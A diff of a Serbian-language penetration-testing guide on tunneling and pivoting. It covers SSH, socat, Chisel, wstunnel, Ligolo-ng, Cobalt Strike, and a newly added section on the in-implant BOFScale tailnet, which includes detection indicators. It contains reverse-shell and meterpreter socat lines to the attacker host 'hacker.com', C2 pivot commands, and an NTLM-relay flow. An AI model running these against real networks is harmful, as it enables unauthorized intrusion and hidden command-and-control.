@@ -1,17 +1,17 @@
-# Tunelovanje i prosleđivanje portova
+# Tunneling i Port Forwarding
 
 {{#include ../banners/hacktricks-training.md}}
 
 ## Nmap savet
 
 > [!WARNING]
-> Nmap-ova podrška za proxy ograničena je na TCP connections i ne utiče na ping, port ili OS-detection scans. Kada se scanner nalazi iza SOCKS proxy-ja, **onemogućite otkrivanje hostova** (`-Pn`) i koristite **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>
+> Nmap podrška za proxy je ograničena na TCP konekcije i ne utiče na ping, skeniranje portova ili skeniranje za detekciju OS-a. Kada se scanner nalazi iza SOCKS proxy-ja, **onemogućite otkrivanje hostova** (`-Pn`) i koristite **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>
 
 ## **Bash**
 
 **Host -> Jump -> InternalA -> InternalB**
 
-Finalna komanda koristi Evil-WinRM opcije `-u` i `-i` za identifikaciju naloga i WinRM hosta; podrazumevani WinRM port je 5985.<sup>[[4]](#references)</sup>
+Završna komanda koristi Evil-WinRM opcije `-u` i `-i` za identifikaciju naloga i WinRM hosta; podrazumevani WinRM port je 5985.<sup>[[4]](#references)</sup>
 ```bash
 # On the jump server connect the port 3333 to the 5985
 mknod backpipe p;
@@ -29,19 +29,19 @@ evil-winrm -u username -i Jump
 ```
 ## **SSH**
 
-OpenSSH može da prosleđuje X11 veze, proizvoljne TCP portove i Unix-domain sokete preko svog šifrovanog kanala.<sup>[[6]](#references)</sup>
+OpenSSH može da prosleđuje X11 veze, proizvoljne TCP portove i Unix domenske sokete preko svog šifrovanog kanala.<sup>[[6]](#references)</sup>
 
 SSH grafička veza (X)
 
-`-Y` omogućava pouzdano X11 prosleđivanje, a `-C` zahteva kompresiju prosleđenih podataka.<sup>[[6]](#references)</sup>
+`-Y` omogućava pouzdano X11 prosleđivanje, a `-C` zahteva kompresiju za prosleđene podatke.<sup>[[6]](#references)</sup>
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
 ### Remote Port2Port
 
-Otvori novi port na SSH Server-u --> Drugi port
+Otvorite novi port na SSH Serveru --> Drugi port
 
-Remote (`-R`) prosleđivanje osluškuje na SSH serveru i povezuje se sa lokalnom stranom; eksplicitna bind adresa kontroliše koji interfejsi mogu da pristupe tom listeneru.<sup>[[6]](#references)</sup>
+Remote (`-R`) forwarding osluškuje na SSH serveru i povezuje se sa lokalnom stranom; eksplicitna bind adresa kontroliše koji interfejsi mogu da pristupe tom listeneru.<sup>[[6]](#references)</sup>
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -63,13 +63,13 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 
 Lokalni port --> Kompromitovani host (SSH) --> Bilo gde
 
-Dynamic (`-D`) forwarding kreira lokalni SOCKS4/SOCKS5 listener čije se konekcije otvaraju sa udaljene strane.<sup>[[6]](#references)</sup>
+Dinamičko prosleđivanje (`-D`) kreira lokalni SOCKS4/SOCKS5 listener čije se konekcije otvaraju sa udaljene strane.<sup>[[6]](#references)</sup>
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Višestruki hop sa ProxyJump
+### Multi-hop sa ProxyJump
 
-`-J`/`ProxyJump` se povezuje sa targetom preko jednog ili više, zarezima razdvojenih jump hostova. Forwarding opcije i dalje pripadaju finalnoj SSH konekciji, tako da SOCKS listener u nastavku otvara destinacije sa `internal-target`, a ne sa prvog bastiona. Ovo izbegava prijavljivanje na jump host i pokretanje drugog SSH klijenta na njemu.<sup>[[6]](#references)</sup>
+`-J`/`ProxyJump` se povezuje sa ciljnom mašinom kroz jedan ili više jump hostova razdvojenih zarezima. Opcije za prosleđivanje i dalje pripadaju konačnoj SSH vezi, tako da SOCKS listener u nastavku otvara destinacije sa `internal-target`, a ne sa prvog bastiona. Time se izbegava prijavljivanje na jump host i pokretanje drugog SSH klijenta na njemu.<sup>[[6]](#references)</sup>
 ```bash
 # Reach the final SSH server through two bastions
 ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target
@@ -77,13 +77,13 @@ ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target
 # Create a local SOCKS proxy whose connections exit from internal-target
 ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
 ```
-Opcije specifične za host za jump machines treba smestiti u `~/.ssh/config`; konfiguracija iz komandne linije namenjena odredištu ne primenjuje se automatski na posredničke hostove.<sup>[[6]](#references)</sup>
+Opcije specifične za host za jump mašine treba postaviti u `~/.ssh/config`; konfiguracija iz komandne linije namenjena odredištu ne primenjuje se automatski na posredničke hostove.<sup>[[6]](#references)</sup>
 
 ### Reverse Port Forwarding
 
-Ovo je korisno za dobijanje reverse shells sa internih hostova kroz DMZ do vašeg hosta:
+Ovo je korisno za dobijanje reverse shell-ova sa internih hostova kroz DMZ do vašeg hosta:
 
-Serverovo podešavanje `GatewayPorts` kontroliše da li remote forward može da se veže izvan loopback-a; njegova podrazumevana vrednost je `no`.<sup>[[7]](#references)</sup>
+Postavka `GatewayPorts` na serveru kontroliše da li remote forward može da se veže izvan loopback interfejsa; njena podrazumevana vrednost je `no`.<sup>[[7]](#references)</sup>
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -94,7 +94,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-Ovaj primer zasnovan na root privilegijama kreira uređaje tun na oba hosta. Server mora da dozvoli tun prosleđivanje, a izabrani nalog mora imati pristup tun uređaju; `PermitRootLogin yes` je jedan od načina da se ovde koristi nalog `root`.<sup>[[6]](#references)[[7]](#references)</sup>\
+Ovaj primer zasnovan na root nalogu kreira tun uređaje na oba hosta. Server mora da dozvoli tun forwarding, a izabrani nalog mora imati pristup tun uređaju; `PermitRootLogin yes` je jedan od načina da se ovde koristi nalog `root`.<sup>[[6]](#references)[[7]](#references)</sup>\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -109,25 +109,25 @@ Omogućite prosleđivanje na strani servera
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 ```
-Podesite novu rutu na strani klijenta
+Postavi novu rutu na strani klijenta
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Security – Terrapin Attack (CVE-2023-48795)**
-> OpenSSH 9.6 je dodao strict-KEX ekstenziju kao zaštitu od Terrapin napada na integritet ranog transporta. Ažurirajte oba peer-a kad god je to moguće i pratite uputstva proizvođača za starije implementacije, umesto da pretpostavite da je prosleđeni kanal zaštićen samo na osnovu verzije.<sup>[[8]](#references)</sup>
+> OpenSSH 9.6 je dodao strict-KEX ekstenziju za suprotstavljanje napadu na integritet ranog transporta Terrapin. Ažurirajte oba peera gde je to moguće i pratite smernice proizvođača za starije implementacije, umesto da pretpostavite da je prosleđeni kanal zaštićen samo na osnovu verzije.<sup>[[8]](#references)</sup>
 
 ## SSHUTTLE
 
-Možete **tunnel** putem **ssh**-a za sav **saobraćaj** ka **podmreži** kroz host.\
-Na primer, prosleđivanje svog saobraćaja namenjenog mreži 10.10.10.0/24
+Možete **tunelovati** sav **saobraćaj** putem **ssh**-a do **podmreže** kroz host.\
+Na primer, prosleđivanje svog saobraćaja koji ide ka 10.10.10.0/24
 
-`sshuttle` obezbeđuje transparentno proxy posredovanje preko SSH-a i podržava izbor podmreža i prilagođene SSH komande, kao što je prikazano u nastavku.<sup>[[9]](#references)</sup>
+`sshuttle` omogućava transparentno proksiranje putem SSH-a i podržava izbor podmreža i prilagođene SSH komande, kao što je prikazano u nastavku.<sup>[[9]](#references)</sup>
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
 ```
-Povezivanje privatnim ključem
+Poveži se privatnim ključem
 ```bash
 sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 # -D : Daemon mode
@@ -166,7 +166,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
 ## Cobalt Strike
 
-Cobalt Strike's Beacon može prosleđivati SOCKS4a/SOCKS5 connections kroz Beacon; `rportfwd` bind-uje na kompromitovanom hostu, dok `rportfwd_local` pokreće connection ka odredištu sa Cobalt Strike klijenta.<sup>[[13]](#references)[[14]](#references)</sup>
+Cobalt Strike-ov Beacon može prosleđivati SOCKS4a/SOCKS5 konekcije kroz Beacon; `rportfwd` se vezuje na kompromitovanom hostu, dok `rportfwd_local` pokreće konekciju ka odredištu sa Cobalt Strike klijenta.<sup>[[13]](#references)[[14]](#references)</sup>
 
 ### SOCKS proxy
 
@@ -181,25 +181,63 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> U ovom slučaju, **port je otvoren na Beacon hostu**, a ne na Team Serveru, a saobraćaj se šalje na Team Server i odatle na navedeni host:port.<sup>[[14]](#references)</sup>
+> U ovom slučaju, **port se otvara na Beacon hostu**, a ne na Team Serveru, i saobraćaj se šalje na Team Server, a odatle na navedeni host:port.<sup>[[14]](#references)</sup>
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
 Priručnik za reverse-forwarding navodi sledeće ponašanje:<sup>[[14]](#references)</sup>
 
-- Beacon-ov reverse port forward je namenjen za **tunneling saobraćaja do Team Server-a, a ne za relay između pojedinačnih mašina**.
+- Beacon-ov reverse port forward je namenjen **tunelovanju saobraćaja do Team Server-a, a ne prosleđivanju između pojedinačnih mašina**.
 - Saobraćaj se **tuneluje unutar Beacon-ovog C2 saobraćaja**, uključujući P2P linkove.
-- Visoki portovi obično zaobilaze ograničenja privilegovanih portova, ali pravila ciljnog OS-a i postojeći listener-i se i dalje primenjuju.
+- Visoki portovi obično izbegavaju ograničenja privilegovanih portova, ali pravila ciljnog OS-a i postojeći listener-i i dalje važe.
 
 ### rPort2Port local
 
 > [!WARNING]
-> U ovom slučaju, **port se otvara na Beacon hostu**, a ne na Team Server-u, i **saobraćaj se šalje Cobalt Strike klijentu** (ne Team Server-u), a odatle na navedeni host:port.<sup>[[14]](#references)</sup>
+> U ovom slučaju, **port se otvara na Beacon hostu**, a ne na Team Server-u, i **saobraćaj se šalje Cobalt Strike klijentu** (ne Team Server-u), a zatim se odatle prosleđuje na navedeni host:port.<sup>[[14]](#references)</sup>
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
 ```
+## BOFScale - tailnet u procesu iza CDN-a
+
+[BOFScale](https://github.com/NetSPI/BOFscale) pokreće modifikovani Tailscale overlay unutar Windows C2 implant-a bez instaliranja TUN driver-a ili service-a. Njegove tri komponente su asinhroni CGo `c-shared` `tailscaled` BOF-PE, mali C++ BOF-PE koji komunicira sa lokalnim API-jem i asinhroni `socksportfwd` TCP-to-SOCKS5 bridge.<sup>[[53]](#references)[[54]](#references)</sup>
+
+### CDN-kompatibilni TS2021 i DERP
+
+Tailscale obično koristi proprietary HTTP upgrades za Noise-based TS2021 control channel i DERP relay. BOFScale zadržava te byte stream-ove, ali ih prenosi kroz RFC 6455 WebSockets, koristeći `Sec-WebSocket-Protocol: ts2021` ili `derp`, tako da Headscale/DERP origin kojim upravlja operator može biti iza CDN-a koji prihvata samo standardne WebSocket upgrades. Izmenjeni client ponavlja TS2021 preko WebSockets nakon HTTP `500`, ponavlja DERP nakon HTTP `426` i podešava da DERP WebSocket dialer poštuje konfiguraciju host proxy-ja; BOF postavlja `TS_DEBUG_DERP_WS_CLIENT=1` kako bi preskočio prvi pokušaj za koji se zna da ne uspeva.<sup>[[53]](#references)[[54]](#references)</sup>
+
+CDN i origin proxy moraju da očuvaju WebSocket upgrades za `/ts2021` i `/derp`, prosleđuju `/key` kao običan HTTP i onemoguće interne read/write timeouts, jer relay sesije mogu ostati otvorene neograničeno. Dostavljena Headscale konfiguracija omogućava `verify_clients`, objavljuje samo operator-ovu ugrađenu DERP mapu i ostavlja `derp.urls` praznim kako bi sprečila fallback na relay-e kojima upravlja Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>
+
+### In-process daemon i named-pipe kontrola
+
+Ako nije drugačije podešeno, BOF entry point pokreće `tailscaled` sa `-tun=userspace-networking`, `-state mem:` i `-no-logs-no-support`, a zatim kreira UUID-named pipe. On preusmerava Go stdout/stderr kroz OS pipe ka Beacon output API-ju, tako da kompletan daemon i Go runtime ostaju u memoriji, dok se state i logovi ne upisuju u Tailscale directory.<sup>[[53]](#references)[[54]](#references)</sup>
+
+Lightweight client reprodukuje Tailscale HTTP/1.0 local API preko tog pipe-a. Otvara pipe sa `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION`, jer daemon-ov `safesocket` layer impersonira pipe client, šalje `Tailscale-Cap: 125` i mapira local API na operacije `up`, `down`, `status`, route advertisement i shutdown.<sup>[[53]](#references)[[54]](#references)</sup>
+
+> [!WARNING]
+> Nemojte unload-ovati ručno mapirani Go BOF-PE nakon što zatražite od daemon-a da se ugasi: runtime i garbage-collector goroutine-i mogu nastaviti da se izvršavaju iz memorije koju loader unmap-uje. Pokrenite `tailscaled` u sacrificial procesu i prekinite taj proces radi konačnog cleanup-a.<sup>[[54]](#references)</sup>
+
+### Prosleđivanje saobraćaja koji potiče sa hosta kroz userspace SOCKS5
+
+Inbound tailnet konekcije i reklamirane subnet rute funkcionišu unutar userspace network stack-a, ali normalni procesi na kompromitovanom hostu nemaju OS rutu ka overlay-u. `socksportfwd` zato osluškuje na TCP portu okrenutom ka victim-u, pregovara o SOCKS5 `NO AUTH` sa daemon-ovim `0.0.0.0:1080` listener-om, šalje `CONNECT` za tailnet destination i asinhrono prosleđuje saobraćaj u oba smera. Kada je target MagicDNS name, koristi `ATYP_DOMAIN`, čime omogućava da `tailscaled` razreši name bez izlaganja Windows resolver-u.<sup>[[53]](#references)[[54]](#references)</sup>
+
+Minimalni operator flow prikazan je u nastavku; i operator node i implant moraju koristiti patched binaries, jer stock Tailscale ne može da prođe kroz ovaj CDN dizajn.<sup>[[53]](#references)[[54]](#references)</sup>
+```bash
+HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
+# Start tailscaled as an asynchronous BOF and copy its printed pipe name
+tailscaled
+tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
+tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
+socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
+```
+Lokalno prosleđivanje može da razdvoji prividni listener za autentikaciju od relay alata: prinudite mašinu da se autentikuje na portu kompromitovanog hosta, prosledite to kroz tailnet do `ntlmrelayx`, a zatim izvršite relay ka AD CS, LDAP, HTTP, SMB ili drugoj kompatibilnoj meti. Pogledajte [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) i [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) za faze specifične za ranjivost; BOFScale je samo transport.<sup>[[54]](#references)</sup>
+
+### Detekcija
+
+Tražite kombinaciju pokazatelja, a ne jedan slab indikator: Go runtime u procesu koji obično nije zasnovan na Go-u, UUID pipe sa permisivnim SDDL-om `D:(A;;GA;;;WD)`, neočekivani `0.0.0.0:1080` SOCKS listener i dugotrajne TLS WebSockets veze ka CDN adresama. Pri TLS inspekciji označite `Sec-WebSocket-Protocol: derp` ili `ts2021` kada proces koji ih poseduje nije autorizovani `tailscaled` servis. Pravila `bofscale.yar` iz repozitorijuma obezbeđuju memorijske potpise za sve tri BOF-PE komponente.<sup>[[53]](#references)[[54]](#references)</sup>
+
 ## reGeorg
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
@@ -210,8 +248,8 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ```
 ## Chisel
 
-Možete ga preuzeti sa stranice releases na [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-Chisel prenosi TCP/UDP saobraćaj preko HTTP-a koristeći SSH-zaštićenu vezu; koristite kompatibilne builds za client/server i proverite sintaksu komandi za izabrani release.<sup>[[16]](#references)</sup>
+Možete ga preuzeti sa stranice sa izdanjima [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
+Chisel prenosi TCP/UDP saobraćaj preko HTTP-a koristeći vezu zaštićenu SSH-om; koristite kompatibilne client/server builds i proverite sintaksu komandi izabranog izdanja.<sup>[[16]](#references)</sup>
 
 ### socks
 ```bash
@@ -229,11 +267,11 @@ Chisel prenosi TCP/UDP saobraćaj preko HTTP-a koristeći SSH-zaštićenu vezu; 
 ```
 ## wstunnel
 
-[`wstunnel`](https://github.com/erebe/wstunnel) prenosi statička ili dinamička prosleđivanja preko WebSocket-a, HTTP/2 ili WebTransport-a (HTTP/3 preko QUIC-a). Trenutne verzije podržavaju TCP, UDP, Unix sockets, stdio, SOCKS5, HTTP proxying i Linux transparent-proxy listeners u forward i reverse režimima.<sup>[[52]](#references)</sup>
+[`wstunnel`](https://github.com/erebe/wstunnel) prenosi statička ili dinamička prosleđivanja preko WebSocket-a, HTTP/2 ili WebTransport-a (HTTP/3 preko QUIC-a). Trenutne verzije podržavaju TCP, UDP, Unix sockets, stdio, SOCKS5, HTTP proxying i Linux transparent-proxy listenere u forward i reverse režimima.<sup>[[52]](#references)</sup>
 
 ### Reverse SOCKS5 pivot
 
-Pokrenite server na napadaču i podesite da se pivot poveže outbound pomoću `-R`. U ovom smeru SOCKS5 listener se kreira na **serveru**, dok zahtevane konekcije potiču iz mreže **client/pivot** uređaja.<sup>[[52]](#references)</sup>
+Pokrenite server na napadačevoj strani i omogućite da se pivot poveže spolja sa `-R`. U ovom smeru SOCKS5 listener se kreira na **serveru**, dok zahtevane konekcije potiču iz mreže **client/pivot** uređaja.<sup>[[52]](#references)</sup>
 ```bash
 # Attacker: use a certificate valid for pivot.example
 wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443
@@ -245,25 +283,25 @@ wstunnel client --tls-verify-certificate \
 # Attacker
 proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
 ```
-Reverse static forward koristi isti smer. Na primer, sledeće izlaže `10.10.10.20:445`, kojem pivot može da pristupi, na loopback portu napadača `8445`:<sup>[[52]](#references)</sup>
+Reverse static forward koristi isti smer. Na primer, sledeće izlaže `10.10.10.20:445`, kojem pivot može da pristupi, na attacker loopback portu `8445`:<sup>[[52]](#references)</sup>
 ```bash
 wstunnel client --tls-verify-certificate \
 -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
 ```
-### Detalji izlaznog saobraćaja i transporta
+### Detalji izlazne konekcije i transporta
 
-- Dodajte `-p http://user:pass@proxy:8080` klijentu da biste prošli kroz eksplicitni HTTP proxy. Koristite `socks5h://127.0.0.1:1080` u klijentima kao što je `curl` (ili omogućite proxied DNS u aplikaciji) kako bi se interna imena razrešavala izvan tunela, umesto da procure lokalnom resolveru.<sup>[[52]](#references)</sup>
-- `wss://` bira TLS-protected WebSocket. `https://` klijent bira HTTP/2, ali buffering ili konverzija HTTP/2 u HTTP/1 koju obavljaju reverse proxies/CDNs često prekida bidirectional stream; prilikom testiranja ovog režima direktno izložite wstunnel server.<sup>[[52]](#references)</sup>
-- `wts://` bira WebTransport over QUIC. Pokrenite server sa `--enable-webtransport` (ili `wts://` listen URL-om) i dozvolite UDP na listening portu. Ovaj režim ne može da prolazi kroz konvencionalni HTTP `CONNECT` proxy zato što taj proxy prenosi TCP.<sup>[[52]](#references)</sup>
+- Dodajte `-p http://user:pass@proxy:8080` klijentu da biste prošli kroz eksplicitni HTTP proxy. Koristite `socks5h://127.0.0.1:1080` u klijentima kao što je `curl` (ili omogućite proxied DNS u aplikaciji) kako bi se interna imena razrešavala izvan tunela, umesto da procure do lokalnog resolvera.<sup>[[52]](#references)</sup>
+- `wss://` bira TLS-om zaštićeni WebSocket. `https://` klijent bira HTTP/2, ali buffering ili konverzija HTTP/2 u HTTP/1 koju obavljaju reverse proxies/CDNs često prekida bidirekcioni stream; pri testiranju ovog režima direktno izložite wstunnel server.<sup>[[52]](#references)</sup>
+- `wts://` bira WebTransport preko QUIC-a. Pokrenite server sa `--enable-webtransport` (ili sa `wts://` listen URL-om) i dozvolite UDP na listening portu. Ovaj režim ne može prolaziti kroz konvencionalni HTTP `CONNECT` proxy zato što taj proxy prenosi TCP.<sup>[[52]](#references)</sup>
 
 > [!WARNING]
-> Upstream projekat upozorava da ugrađeni self-signed certificate ne treba smatrati zaštitom privatnosti. Prednost dajte validnom custom certificate-u uz `--tls-verify-certificate` (ili mTLS), zadržite proxy listeners na loopback-u osim ako je udaljeni pristup nameran i tunelujte već bezbedne protokole kada je poverljivost važna.<sup>[[52]](#references)</sup>
+> Upstream projekat upozorava da ugrađeni self-signed sertifikat ne treba smatrati zaštitom privatnosti. Dajte prednost važećem prilagođenom sertifikatu uz `--tls-verify-certificate` (ili mTLS), zadržite proxy listenere na loopback-u osim ako je udaljeni pristup nameran i tunelujte već bezbedne protokole kada je poverljivost važna.<sup>[[52]](#references)</sup>
 
 ## Ligolo-ng
 
 [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 
-Ligolo-ng quickstart dokumentuje TUN interface na proxy-ju, validaciju certificate fingerprint-a za agenta i podešavanje ruta za tunneled network.<sup>[[17]](#references)</sup>
+Ligolo-ng quickstart opisuje TUN interfejs na proxyju, proveru fingerprinta sertifikata za agenta i podešavanje ruta za tunelovanu mrežu.<sup>[[17]](#references)</sup>
 
 ### Tunneling
 ```bash
@@ -287,9 +325,9 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Agent Binding and Listening
+### Povezivanje agenta i osluškivanje
 
-Ligolo-ng može da doda listenere na agentu koji prosleđuju saobraćaj ka adresi na proxy strani, a njegov rezervisani opseg `240.0.0.0/4` može da se rutira kako bi se došlo do servisa lokalnih za agenta.<sup>[[18]](#references)[[19]](#references)</sup>
+Ligolo-ng može da doda listenere na agentu koji prosleđuju saobraćaj na adresu na strani proxy-ja, a njegov rezervisani opseg `240.0.0.0/4` može da se rutira radi pristupa servisima na agentu.<sup>[[18]](#references)[[19]](#references)</sup>
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -307,7 +345,7 @@ interface_add_route --name "ligolo" --route 240.0.0.1/32
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-Rpivot pokreće reverse tunnel sa žrtve i izlaže SOCKS4 proxy na loopback adresi napadača; njegov README takođe dokumentuje kredencijale i opcije za hash za NTLM-proxy.<sup>[[20]](#references)</sup>
+Rpivot pokreće reverzni tunel sa žrtve i izlaže SOCKS4 proxy na loopback adresi napadača; njegov README takođe dokumentuje akreditive NTLM-proxy-ja i opcije za hash.<sup>[[20]](#references)</sup>
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
 ```
@@ -327,7 +365,7 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-Socat kombinuje tipove adresa kao što su `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` i `PROXY`; primeri u nastavku kombinuju te dokumentovane endpoint-e.<sup>[[21]](#references)</sup>
+Socat kombinuje tipove adresa kao što su `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` i `PROXY`; primeri u nastavku kombinuju te dokumentovane krajnje tačke.<sup>[[21]](#references)</sup>
 
 ### Bind shell
 ```bash
@@ -357,7 +395,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Možete proći kroz **neautentifikovani proxy** pomoću socat-ovog dokumentovanog tipa adrese `PROXY` tako što ćete izvršiti ovu liniju umesto poslednje u konzoli žrtve.<sup>[[21]](#references)</sup>
+Možete proći kroz **proxy bez autentikacije** koristeći socat-ov dokumentovani tip adrese `PROXY`, tako što ćete izvršiti ovu liniju umesto poslednje u konzoli žrtve.<sup>[[21]](#references)</sup>
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -365,9 +403,9 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 ### SSL Socat tunel
 
-**/bin/sh konzola**
+**/bin/sh console**
 
-Kreirajte sertifikate na obe strane: klijent i server
+Kreirajte sertifikate na obe strane: Client i Server
 ```bash
 # Execute these commands on both sides
 FILENAME=socatssl
@@ -383,7 +421,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-Povežite lokalni SSH port (22) sa portom 443 na attacker hostu
+Povežite lokalni SSH port (22) sa portom 443 napadačevog hosta
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -391,11 +429,11 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Plink je PuTTY-jeva alatka za povezivanje iz komandne linije, sa opcijama za SSH prosleđivanje sličnim alatki `ssh`.<sup>[[22]](#references)</sup>
+Plink je PuTTY-jev alat za povezivanje iz komandne linije, sa opcijama za SSH forwarding sličnim alatu `ssh`.<sup>[[22]](#references)</sup>
 
-Koristite veliko slovo `-P` za SSH port. `-pw` je zadržan radi kompatibilnosti, ali izlaže lozinku u listi procesa; gde je moguće, prednost dajte autentifikaciji pomoću ključa ili opciji `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>
+Koristite veliko slovo `-P` za SSH port. `-pw` je zadržan radi kompatibilnosti, ali izlaže lozinku u listi procesa; gde je moguće, prednost dajte autentikaciji pomoću ključa ili opciji `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>
 
-Pošto će se ovaj binarni fajl izvršavati na žrtvi i predstavlja SSH klijent, otvorite SSH servis i port za povratnu vezu; sledeći primer koristi `-R` za prosleđivanje lokalno dostupnog porta ka mašini napadača.<sup>[[22]](#references)</sup>
+Pošto će ovaj binary biti izvršen na žrtvinom sistemu i predstavlja SSH klijent, otvorite SSH servis i port za reverse konekciju; u nastavku se koristi `-R` za prosleđivanje lokalno dostupnog porta ka napadačevoj mašini.<sup>[[22]](#references)</sup>
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -404,7 +442,7 @@ echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0
 
 ### Port2Port
 
-Koristite kontekst sa dozvolama koje zahteva host prilikom kreiranja ili menjanja persistent `portproxy` pravila. Microsoft dokumentuje forme `v4tov4` za dodavanje, prikazivanje i brisanje koje su korišćene u nastavku.<sup>[[24]](#references)</sup>
+Koristite kontekst sa dozvolama koje host zahteva prilikom kreiranja ili menjanja persistent `portproxy` pravila. Microsoft dokumentuje forme `v4tov4` za dodavanje, prikazivanje i brisanje koje su korišćene u nastavku.<sup>[[24]](#references)</sup>
 ```bash
 netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
 # Example:
@@ -419,37 +457,37 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Potrebno je da imate **RDP pristup sistemu**.\
 Preuzmite:
 
-SocksOverRDP koristi Remote Desktop Dynamic Virtual Channels za prenos SOCKS5 veze preko postojeće RDP sesije; client plugin osluškuje na `127.0.0.1:1080`, dok server komponenta radi na RDP odredištu.<sup>[[25]](#references)</sup>
+SocksOverRDP koristi Remote Desktop Dynamic Virtual Channels za prenos SOCKS5 veze preko postojeće RDP sesije; klijentski plugin osluškuje na `127.0.0.1:1080`, dok serverska komponenta radi na RDP odredištu.<sup>[[25]](#references)</sup>
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Ovaj alat koristi `Dynamic Virtual Channels` (`DVC`) iz funkcije Remote Desktop Service sistema Windows. DVC je zadužen za **tunneling paketa preko RDP veze**.
-2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
